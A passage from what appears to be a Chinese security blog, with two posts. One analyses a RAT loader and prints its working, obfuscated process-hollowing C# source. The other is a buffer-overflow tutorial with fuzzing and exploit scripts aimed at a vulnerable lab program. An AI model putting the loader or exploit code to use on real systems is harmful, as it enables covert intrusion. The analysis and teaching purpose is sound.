解密gzip压缩的cs源码的内容    2. 利用csc编译成dll    3. 利用InstallUtil.exe调用dll里的Execute函数-&gt;Execute(string path, byte[] payload)加载Trojan RAT dll</code></pre><p>powershell ISE断点分析:<br><img src="https://z3.ax1x.com/2021/05/09/gJXcSf.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJXgl8.png" alt=""></p><p>火绒剑动态运行监控:<br><img src="https://z3.ax1x.com/2021/05/09/gJXROg.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJXfmQ.png" alt=""></p><p>解密出来的cs源码分析：</p><pre><code class="csharp">using System;using System.Diagnostics;using System.Runtime.InteropServices;using Microsoft.VisualBasic;namespace projFUD{    public static class PA    {        public static string ReverseString(string Str)        {            string Revstr = &quot;&quot;;            int Length;            Length = Str.Length - 1;            while (Length &gt;= 0)            {                Revstr = Revstr + Str[Length];                Length--;            }            return Revstr;        }        public static string BinaryToString(string str)        {            string chars = System.Text.RegularExpressions.Regex.Replace(str, &quot;[^01]&quot;, &quot;&quot;);            byte[] arr = new byte[(chars.Length / 8) - 1 + 1];            for (int i = 0; i &lt;= arr.Length - 1; i++)                arr[i] = Convert.ToByte(chars.Substring(i * 8, 8), 2);            return System.Text.ASCIIEncoding.ASCII.GetString(arr);        }        private delegate int DelegateResumeThread(IntPtr handle);        private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);        private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);        private delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);        private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);        private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);        private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);        private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);        private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);        private delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);        private static string[] AL = Convert.ToString(&quot;0011001000110011011011000110010101101110011100100110010101101011|0110110001101100011001000111010001101110|011001000110000101100101011100100110100001010100011001010110110101110101011100110110010101010010|011101000111100001100101011101000110111001101111010000110110010001100001011001010111001001101000010101000111010001100101010100110011010000110110011101110110111101010111|01110100011110000110010101110100011011100110111101000011011001000110000101100101011100100110100001010100011101000110010101010011|011101000111100001100101011101000110111001101111010000110110010001100001011001010111001001101000010101000111010001100101010001110011010000110110011101110110111101010111|01110100011110000110010101110100011011100110111101000011011001000110000101100101011100100110100001010100011101000110010101000111|0111100001000101011000110110111101101100011011000100000101101100011000010111010101110100011100100110100101010110|011110010111001001101111011011010110010101001101011100110111001101100101011000110110111101110010010100000110010101110100011010010111001001010111|0111100101110010011011110110110101100101010011010111001101110011011001010110001101101111011100100101000001100100011000010110010101010010|0110111001101111011010010111010001100011011001010101001101100110010011110111011101100101011010010101011001110000011000010110110101101110010101010111011101011010|0100000101110011011100110110010101100011011011110111001001010000011001010111010001100001011001010111001001000011|&quot;).Split(new string[] { &quot;|&quot; }, StringSplitOptions.None);        private static string Kernel32 = BinaryToString(AL[0]);        private static string ntdll = BinaryToString(AL[1]);        private static string RsmThread = BinaryToString(AL[2]);        private static string Wow64SetThreadCtx = BinaryToString(AL[3]);        private static string SetThreadCtx = BinaryToString(AL[4]);        private static string Wow64GetThreadCtx = BinaryToString(AL[5]);        private static string GetThreadCtx = BinaryToString(AL[6]);        private static string VirtualAllcEx = BinaryToString(AL[7]);        private static string WriteProcessMem = BinaryToString(AL[8]);        private static string ReadProcessMem = BinaryToString(AL[9]);        private static string ZwUnmapViewOfSec = BinaryToString(AL[10]);        private static string CreateProcA = BinaryToString(AL[11]);        private static readonly DelegateResumeThread ResumeThread = LoadApi&lt;DelegateResumeThread&gt;(ReverseString(Kernel32), ReverseString(RsmThread));        private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi&lt;DelegateWow64SetThreadContext&gt;(ReverseString(Kernel32), ReverseString(Wow64SetThreadCtx));        private static readonly DelegateSetThreadContext SetThreadContext = LoadApi&lt;DelegateSetThreadContext&gt;(ReverseString(Kernel32), ReverseString(SetThreadCtx));        private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = LoadApi&lt;DelegateWow64GetThreadContext&gt;(ReverseString(Kernel32), ReverseString(Wow64GetThreadCtx));        private static readonly DelegateGetThreadContext GetThreadContext = LoadApi&lt;DelegateGetThreadContext&gt;(ReverseString(Kernel32), ReverseString(GetThreadCtx));        private static readonly DelegateVirtualAllocEx VirtualAllocEx = LoadApi&lt;DelegateVirtualAllocEx&gt;(ReverseString(Kernel32), ReverseString(VirtualAllcEx));        private static readonly DelegateWriteProcessMemory WriteProcessMemory = LoadApi&lt;DelegateWriteProcessMemory&gt;(ReverseString(Kernel32), ReverseString(WriteProcessMem));        private static readonly DelegateReadProcessMemory ReadProcessMemory = LoadApi&lt;DelegateReadProcessMemory&gt;(ReverseString(Kernel32), ReverseString(ReadProcessMem));        private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = LoadApi&lt;DelegateZwUnmapViewOfSection&gt;(ReverseString(ntdll), ReverseString(ZwUnmapViewOfSec));        private static readonly DelegateCreateProcessA CreateProcessA = LoadApi&lt;DelegateCreateProcessA&gt;(ReverseString(Kernel32), ReverseString(CreateProcA));        [DllImport(&quot;kernel32&quot;, SetLastError = true)]        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);        [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]        private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);        private static CreateApi LoadApi&lt;CreateApi&gt;(string name, string method)        {            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));        }        [StructLayout(LayoutKind.Sequential, Pack = 1)]        private struct ProcessInformation        {            public readonly IntPtr ProcessHandle;            public readonly IntPtr ThreadHandle;            public readonly uint ProcessId;            private readonly uint ThreadId;        }        [StructLayout(LayoutKind.Sequential, Pack = 1)]        private struct StartupInformation        {            public uint Size;            private readonly string Reserved1;            private readonly string Desktop;            private readonly string Title;            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]            private readonly byte[] Misc;            private readonly IntPtr Reserved2;            private readonly IntPtr StdInput;            private readonly IntPtr StdOutput;            private readonly IntPtr StdError;        }        public static void Execute(string path, byte[] payload) //傀儡进程实现        {            for (int i = 0; i &lt; 5; i++)            {                int readWrite = 0;                StartupInformation si = new StartupInformation();                ProcessInformation pi = new ProcessInformation();                si.Size = UInt32.Parse(Marshal.SizeOf(typeof(StartupInformation)).ToString());                string ToInt32 = System.Text.Encoding.Default.GetString(new byte[] { 0x54, 0x6F, 0x49, 0x6E, 0x74, 0x33, 0x32 });                string ToInt16 = System.Text.Encoding.Default.GetString(new byte[] { 0x54, 0x6F, 0x49, 0x6E, 0x74, 0x31, 0x36 });                try                {                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 4 | 134217728, IntPtr.Zero, null, ref si, ref pi)) throw new Exception(); //创建进程                    int fileAddress = (int)Interaction.CallByName(typeof(BitConverter).GetMethod(ToInt32), BinaryToString(&quot;010010010110111001110110011011110110101101100101&quot;), CallType.Method, new object[] { null, new object[] { payload, (30 * 2) } });                    int imageBase = (int)Interaction.CallByName(typeof(BitConverter).GetMethod(ToInt32), BinaryToString(&quot;010010010110111001110110011011110110101101100101&quot;), CallType.Method, new object[] { null, new object[] { payload, fileAddress + (26 * 2) } });                    int[] context = new int[Convert.ToInt32(89 + 90)];                    context[0] = 65538;                    if (IntPtr.Size == 4) //如果字节为4位（32位）                    { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); } //检索指定线程的上下文                    else //64位                    { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); } //来检索WOW64线程的上下文                    int ebx = context[(20 + 21)];                    int baseAddress = 0;                    if (!ReadProcessMemory(pi.ProcessHandle, ebx + 8, ref baseAddress, 4, ref readWrite)) throw new Exception(); //读取内存                    if (imageBase == baseAddress)                        if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0) throw new Exception();                    int sizeOfImage = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, fileAddress + 80 });                    int sizeOfHeaders = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, fileAddress + 84 });                    bool allowOverride = false;                    int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 12288, 64);                    if (newImageBase == 0) throw new Exception();                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite)) throw new Exception();                    int sectionOffset = fileAddress + 248;                    short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 6);                    for (int I = 0; I &lt; numberOfSections; I++)                    {                        int virtualAddress = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, sectionOffset + 12 });                        int sizeOfRawData = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, sectionOffset + 16 });                        int pointerToRawData = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, sectionOffset + 20 });                        if (sizeOfRawData != 0)                        {                            byte[] sectionData = new byte[sizeOfRawData];                            Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0, sectionData.Length);                            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();                        }                        sectionOffset += 40;                    }                    byte[] GB = BitConverter.GetBytes(newImageBase);                    if (!WriteProcessMemory(pi.ProcessHandle, ebx + 8, GB, 4, ref readWrite)) throw new Exception();                    int addressOfEntryPoint = (int)Interaction.CallByName(typeof(BitConverter).GetMethod(ToInt32), BinaryToString(&quot;010010010110111001110110011011110110101101100101&quot;), CallType.Method, new object[] { null, new object[] { payload, fileAddress + 40 } });                    if (allowOverride) newImageBase = imageBase;                    context[44] = newImageBase + addressOfEntryPoint;                    if (IntPtr.Size == 4)                    {                        var x = SetThreadContext(pi.ThreadHandle, context);                        if (!x)                        {                            throw new Exception();                        }                    }                    else                    {                        var y = Wow64SetThreadContext(pi.ThreadHandle, context);                        if (!y)                        {                            throw new Exception();                        }                    }                    int r = (int)Interaction.CallByName(ResumeThread, BinaryToString(&quot;010010010110111001110110011011110110101101100101&quot;), CallType.Method, new object[] { pi.ThreadHandle });                    if (r == -1 * 1)                    {                        throw new Exception();                    }                }                catch                {                    Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill(); //执行失败的话返回当前进程PID并杀死                    continue;                }                break;            }        }    }}</code></pre><p>cs主要实现傀儡进程，加载Trojan RAT的dll，如果执行失败的话返回当前进程PID并杀死</p><p>Trojan RAT DLL分析:<br>Main函数入口点分析</p><pre><code>1. 延时2.5秒2. 创建flag互斥体    * 创建flag互斥体    * 互斥体创建失败则退出1. 调用PreventSleep.Run()函数 【防止系统在应用程序运行时进入睡眠状态或关闭显示器】2. Application.ApplicationExit （在应用程序即将关闭时发生）-&gt;调用Config.programMutex.ReleaseMutex() 释放互斥锁3. 调用Client.RUN()函数</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJXj0J.png" alt=""></p><p>PreventSleep.Run函数<br><img src="https://z3.ax1x.com/2021/05/09/gJji6O.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJjAne.png" alt=""></p><p>Config<br><img src="https://z3.ax1x.com/2021/05/09/gJjK9P.png" alt=""></p><p>Client.RUN函数分析:</p><pre><code>1. 创建多线程调用Client.TcpReceive函数2. 检测Client.isConnected是否为true（默认为False），如果为false释放所有缓冲区。将收集到的系统信息发送到kimjoy.ddns.net，并将Client.isConnected设置为true。创建一个计时器，该计时器在30秒钟后调用Client.Ping函数。然后创建新的缓冲区，如果上述操作失败将Client.isConnected设置为False</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJjNhq.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJjDuF.png" alt=""></p><pre><code>1. 进入循环2. 检测socket状态是否为读取状态模式(Client.client.Poll(-1, SelectMode.SelectRead))和获取返回的值(Client.client.Available)是否成功或者连接(!Client.client.Connected)是否成功，如果其中一项失败退出循环3. 指定缓冲区</code></pre><pre><code>byte[] array = new byte[Client.client.Available];Interaction.CallByName(Client.client, &quot;Receive&quot;, CallType.Method, new object[]{    array,    0,    array.Length,    SocketFlags.None}); //连接的Socket上接收数据之前的数据缓冲区，偏移量，大小和套接字标志</code></pre><pre><code>1. 判断缓冲区里是否存在!@#%^NYAN#!@$ （存在!@#%^NYAN#!@$）2. </code></pre><p>接收到发送来的数据后写入缓冲区 Client.memoryStream.Write(array, 0, array.Length);</p><pre><code>    * 存在的话则从MemoryStream解密内容 Array[] array2 = (Array[])Client.PacketFixer(Client.memoryStream.ToArray(), Config.splitter);    * 实例化PacketHandler类 PacketHandler @object = new PacketHandler();        * 线程池实例化PacketHandler.Handler函数 Thread thread = new Thread(new ParameterizedThreadStart(@object.Handler));    * 将缓冲区里的首位字符串传入PacketHandler.Handler函数作为参数，启用线程池 thread.Start(array2[0])    * 释放缓冲区 Client.memoryStream.Dispose()    * 新建缓冲区Client.memoryStream = new MemoryStream();    * 解密后的数组长度不为2则退出循环    * 在将解密数组的1位元素写入新的缓冲区 Client.memoryStream.Write((byte[])array2[1], 0, ((byte[])array2[1]).Length)1. 缓冲区里不存在!@#%^NYAN#!@$* 设置socket连接状态为false并退出循环 Client.isConnected = false;break</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJjg41.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJjW36.png" alt=""></p><p>SendInfo函数分析<br>(每个功能都使用config.key进行分割)</p><pre><code>* IdGenerator.GetHardDiskSerialNumber()当前盘符数量* IdGenerator.GetIp()获取当前机器IP* 获取主机名Environment.MachineName和用户名Environment.UserName* IdGenerator.GetCamera()检索捕获驱动程序的版本说明* new ComputerInfo().OSFullName获取系统名称和当前所有进程IdGenerator.GetSystem()* IdGenerator.GetCpu()获取当前CPU名称* ComputerInfo().TotalPhysicalMemory物理内存总量* IdGenerator.GetAV()通过wmic查询检测杀毒* config.port* IdGenerator.GetActiveWindow()获取当前窗口标题* 当前线程区域性的名称CultureInfo.CurrentCulture.Name</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJjb4I.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJvSbQ.png" alt=""></p><p>PacketHandler.Handler函数<br>根据解密的数组的0位元素做出对应的判断</p><pre><code>* 如果array[0]==&quot;PNC&quot; ，重置计时器，开始计时，发送PNC字符串给远程服务器* 如果array[0]==&quot;P&quot;，停止计时器，发送P字符串+config.key+Config.stopwatch.ElapsedMilliseconds（计时器的运行时间），并发送W字符串+config.key+当前窗口标题* 如果array[0]==&quot;IE&quot;，打开注册表HKEY_CURRENT_USER\SOFTWARE\RXQLV8XYTDNHNSA\array[1]，如果存在该注册表路径调用Invoke函数（this.Invoke(Config.host, Config.port, array[4], array[5], StringConverter.Encode(StringConverter.Decode(Config.id) + &quot;_&quot; + IdGenerator.GetHardDiskSerialNumber())），并从注册表HKEY_CURRENT_USER\SOFTWARE\RXQLV8XYTDNHNSA\array[1]，读取指定的内容，并将array[1]转换为布尔值，跳转到IL_395，如果注册表路径不存在，发送GPL字符串+config.key+array[5]+key+array[1]+key+false字符串，跳转到IL_395执行* 如果array[0]==&quot;LP&quot;执行invoke函数this.Invoke(Config.host, Config.port, array[1], array[2], StringConverter.Encode(StringConverter.Decode(Config.id) + &quot;_&quot; + IdGenerator.GetHardDiskSerialNumber()), array[3], int.Parse(array[4]), Convert.ToBoolean(array[5]), array[6], Convert.ToBoolean(array[7]))* 如果array[0]==&quot;UNV&quot;调用GetAssembly加载发送来的程序集调用</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJvlP1.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJvYrD.png" alt=""><br><img src="https://i.bmp.ovh/imgs/2021/05/020fc9e4e3003092.png" alt=""></p><p>invoke函数<br>bytes=&gt;CreateInstance<br>bytes2=&gt;Start<br>加载对应的程序集调用，创建对应的注册表设置键值<br><img src="https://z3.ax1x.com/2021/05/09/gJxEFA.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJxZWt.png" alt=""></p><p>GetAssembly函数<br>bytes=&gt;SLoad<br>加载程序集之前先base64解码，gzip流解压。在加载<br><img src="https://z3.ax1x.com/2021/05/09/gJxmSP.png" alt=""></p><p>微步情报<br><img src="https://z3.ax1x.com/2021/05/09/gYSBGR.png" alt=""></p><p>请求信息<br><img src="https://z3.ax1x.com/2021/05/09/gYpaOf.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows缓冲区溢出学习</title>
      <link href="/posts/ee8c55e.html"/>
      <url>/posts/ee8c55e.html</url>
      <content type="html"><![CDATA[<p>原文链接:<a href="https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/" target="_blank" rel="noopener">https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/</a><br>算是翻译文</p><h2 id="什么是缓冲区溢出？"><a href="#什么是缓冲区溢出？" class="headerlink" title="什么是缓冲区溢出？"></a>什么是缓冲区溢出？</h2><p>缓冲区是易失性的内存分配，它们在将数据从一个位置传输到另一位置时临时保存数据。当正在处理的数据超出存储缓冲区的存储容量时，将发生缓冲区溢出。这导致程序覆盖相邻存储器位置中的过大数据，从而导致缓冲区溢出。当我们对char类型的缓冲区进行操作时，将发生缓冲区溢出。</p><p>我们将通过一些示例来尝试理解这个概念。例如，缓冲区的设计方式是接受8个字节的数据，在这种情况下，如果用户输入的数据超过8个字节，则超过8个字节的数据将覆盖相邻的内存，从而超过分配的缓冲区边界。最终将产生分段错误，随后出现许多其他错误，从而导致程序执行被终止。</p><h2 id="缓冲区溢出的类型"><a href="#缓冲区溢出的类型" class="headerlink" title="缓冲区溢出的类型"></a>缓冲区溢出的类型</h2><p>缓冲区溢出有两种类型。让我们讨论两者的简短介绍。</p><p><strong>堆栈缓冲区溢出/Vanilla Buffer缓冲区溢出</strong><br>当程序覆盖缓冲区边界之外的程序的调用堆栈上的内存地址时，就会发生这种情况，缓冲区边界的长度是固定的。在堆栈缓冲区溢出中，多余的数据将被写入位于堆栈上的相邻缓冲区中。由于与堆栈上溢出的相邻内存位置中的内存损坏相关的错误，通常会导致应用程序崩溃。</p><p><strong>堆缓冲区溢出</strong><br>堆是用于管理动态内存分配的内存结构。它通常用于分配在编译时未知大小的内存，因为所需的内存量太大，以致于无法将其装入堆栈中。堆溢出或溢出是堆数据区域中发生的一种缓冲区溢出。基于堆的溢出利用不同于基于堆栈的溢出利用。堆上的内存在运行时动态分配，通常包含程序数据。通过以特定方式破坏此数据以使应用程序覆盖内部结构（如链接列表指针）来完成利用。</p><p><strong>堆栈缓冲区溢出攻击</strong><br>最常见的缓冲区溢出攻击称为基于堆栈的缓冲区溢出攻击或普通缓冲区溢出攻击，通常由一个堆栈构成，直到且除非程序需要用户输入，例如用户名或密码，否则堆栈为空。然后，程序将返回存储器地址写入堆栈，然后将用户的输入存储在堆栈顶部。处理堆栈时，用户的输入将发送到程序指定的返回地址。</p><p><img src="https://z3.ax1x.com/2021/05/07/g3jWi6.png" alt=""></p><p>但是，在开始时会为堆栈分配特定数量的内存，这使其变得有限。如果用户输入的数据大于堆栈中分配的内存量，并且程序没有适当的输入验证，可以验证所提供的数据是否适合分配的内存，则将导致在溢出。<br>如果堆栈缓冲区中填充了不受信任用户提供的数据，则用户可以以将恶意可执行代码注入正在运行的程序并控制进程的方式来破坏堆栈。</p><h2 id="Windows缓冲区溢出攻击"><a href="#Windows缓冲区溢出攻击" class="headerlink" title="Windows缓冲区溢出攻击"></a>Windows缓冲区溢出攻击</h2><p>Buffer Overflow可在包括Linux，Windows和其他各种平台的不同平台上工作，因为它处理内存而不是基于内存的内容。由于要在Linux上处理内存寄存器可能有点困难，因此我们先做出明智的选择，首先了解具有可执行文件的Windows机器上的缓冲区溢出的各个步骤和技术，然后再继续进行操作。</p><p>这里属于堆栈溢出</p><p>在Windows设备上的缓冲区溢出攻击的演示中，我们将使用容易受到缓冲区溢出攻击的公共Windows应用程序。<br>示例exe：<a href="https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood.exe" target="_blank" rel="noopener">https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood.exe</a><br>调试工具：<a href="https://debugger.immunityinc.com/ID_register.py" target="_blank" rel="noopener">https://debugger.immunityinc.com/ID_register.py</a><br>此exe为32位，没开启ASLR（windows开启ASLR后没法绕）<br><img src="https://z3.ax1x.com/2021/05/07/g3j4zD.png" alt=""></p><p>（原本想使用OD的，但是崩溃的时候OD的ESP没有给出内容）<br>管理员权限运行Immunity Debugger<br>将exe拖入Immunity Debugger，F9运行 （运行dostackbufferoverflowgood.exe会开启31337端口）<br><img src="https://z3.ax1x.com/2021/05/07/g3josH.png" alt=""></p><p>nmap扫描<br><img src="https://z3.ax1x.com/2021/05/07/g3jTLd.png" alt=""></p><p>Fuzz测试崩溃需要的bytes</p><pre><code class="python">import socketstring=b&quot;\x41&quot; * 10ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)while True:    try:        print(&quot;Fuzz with {} bytes&quot;.format(len(string)))        s.sendall(string+b&quot;\x0a\x0d&quot;)        string+=b&quot;\x41&quot; * 10        s.recv(1024)    except:        print(&quot;Fuzzer stop at {} bytes&quot;.format(len(string)))        exit(0)s.close()</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3jOFP.png" alt=""></p><p>在Immunity Debugger中检查进程状态，则可以看到该应用程序现在处于暂停状态。要注意的另一件事是ESP寄存器中的A溢出。这确认了如果我们在其中发送160个A或160字节的数据，应用程序将崩溃。<br><img src="https://z3.ax1x.com/2021/05/07/g3jXJf.png" alt=""></p><p>寄存器介绍：<br>EAX –这是一个累加器寄存器，用于执行算术计算，如加，减，比较和存储函数调用的返回值。<br>ECX –该寄存器的作用类似于用于迭代的计数器，它以递减的方式计数。<br>EDX –该寄存器保存额外的数据，以执行复杂的计算，例如乘法和除法。它充当EAX寄存器的扩展。<br>EBX –它是没有任何定义用途的基址寄存器，可用于存储数据。<br>ESP –它是堆栈指针。它指示当前指令在内存中的位置。它始终指向堆栈的顶部。<br>EBP –它是指向堆栈基础的基础指针。<br>ESI –被称为源索引寄存器，用于保存输入数据的位置。<br>EDI –它是目标索引寄存器，指向存储已处理数据结果的位置。<br>EIP –它是指令指针寄存器。它是一个只读寄存器，其中保存要读取的下一条指令的地址。</p><p><strong>偏移发现和控制EIP</strong><br>EIP偏移量是一个确切的值，它为我们提供了以下信息：多少字节将填充缓冲区并溢出到返回地址（EIP）中。<br>控制EIP是缓冲区溢出攻击的一个非常关键的部分，因为EIP是最终将指向我们的恶意代码以便可以执行的寄存器。在对应用程序进行模糊测试时，我们看到它崩溃了160个字节，这意味着EIP位于1到160个字节之间。因此，我们将在MSF中使用模式创建工具，该工具会生成某些字节的模式，这将引导我们找到确切的偏移值。我们将生成一个200字节的模式。多出40个字节，以进行一些额外的填充。</p><pre><code>msf-pattern_create -l 200</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3vpLj.png" alt=""></p><p>重加载程序<br>发送测试</p><pre><code class="python">import socketbuffer=b&quot;&lt;msf-pattern_create生成的buffer&gt;&quot;buffer+=b&quot;\n&quot;ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)s.sendall(buffer)</code></pre><p>该漏洞导致访问冲突错误，程序崩溃。现在，ESP寄存器显示了我们发送给应用程序使其崩溃的模式。现在，如果我们查看EIP寄存器，则值为39654138<br><img src="https://z3.ax1x.com/2021/05/07/g3vPwn.md.png" alt=""></p><p>msf-pattern_offset计算出EIP偏移大小</p><pre><code>msf-pattern_offset -l 200 -q 39654138</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3vioq.png" alt=""></p><p>现在我们知道EIP偏移值，我们不再需要发送模式。我们可以简单地发送146个A代替该模式。我们将在146 A之后发送4 B，以确保我们可以控制EIP。如果漏洞利用代码执行后EIP寄存器中有4个B，那么可以确认我们现在可以控制EIP了。<br><img src="https://z3.ax1x.com/2021/05/07/g3vZSU.png" alt=""></p><pre><code>import socketoffset=146eip=b&quot;B&quot; * 4buffer=b&quot;A&quot;*offset+eip #&quot;A&quot;*offset为填充缓冲区，+eip是溢出来的4个字节buffer+=b&quot;\n&quot;ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)s.sendall(buffer)</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3velF.png" alt=""><br>如上图所示，EIP寄存器为“ 42424242”。ASCII字符“ B”的十六进制值为0x42。因此，在这一点上已确认我们可以控制EIP寄存器。</p><p><strong>寻找坏字节 </strong><br>坏字符是破坏shellcode的不需要的字符。查找和忽略不良字符是必要的，因为不良字符会在出现的任何地方终止字符串执行。如果最后在我们的shellcode中存在任何坏字符，那么它将在该坏字符所在的位置停止执行，因此在生成我们的shellcode时，我们将忽略所有坏字符。</p><p>要查找不良字符，我们首先将使用python脚本生成所有字符，然后将其发送到应用程序以进行崩溃和分析。下面的代码生成从x01到xff的所有字符，而没有x00，因为x00在默认情况下是错误字符。x00被称为空字节。</p><pre><code>for x in range(1,256):    print(&quot;\\x&quot;+&quot;{:02x}&quot;.format(x),end=&quot;&quot;)print(&quot;&quot;)</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3vQT1.png" alt=""></p><p>修改脚本发送:</p><pre><code class="python">import socketoffset=146eip=b&quot;B&quot; * 4buf=b&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;buffer=b&quot;A&quot;*offset+eip+bufbuffer+=b&quot;\n&quot;ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)s.sendall(buffer)</code></pre><p>将对ESP的十六进制转储与所有字符进行比较，以查找内存中出现的任何不良字符。为此，我们将选择ESP，然后在转储中选择“跟随”。<br>（字符损坏的十六进制会变成00）</p><p><img src="https://z3.ax1x.com/2021/05/07/g3v8fK.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/07/g3vNOH.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/07/g3vd0A.png" alt=""></p><p>将十六进制转储与发送的所有字符进行比较，我们将看到从01到09一切都很好，但是09之后是21，而不是0A。这意味着”\x0a”是错误字符。<br>检查从01到FF的ESP十六进制转储，可以在上图中看到，我们现在推导出了所有不良字符，这意味着“ \ x00”和“ \ x0a”是唯一出现的不良字符。</p><h2 id="JMP-ESP"><a href="#JMP-ESP" class="headerlink" title="JMP ESP"></a>JMP ESP</h2><p>(寻找调用jmp ESP的地址，可以修改EIP为对应的jmp ESP地址这里可以这么做，原因是这里并没开启ASLR，开启了ASLR需要另外操作)<br>为了找到JMP ESP，我们将使用mona模块。我们需要下载mona.py并将其粘贴到C:\Program Files（x86\Immunity Inc\Immunity Debugger\PyCommands中。<br>发生访问冲突时，ESP寄存器指向包含我们已发送给应用程序的数据的内存。JMP ESP指令用于将代码执行重定向到该位置。要找到JMP ESP，我们需要使用带有–cpb选项的mona模块以及我们之前发现的所有不良字符，这将避免mona返回具有不良字符的内存指针。运行命令后，我们需要打开日志数据。</p><pre><code>!mona jmp -r esp -cpb 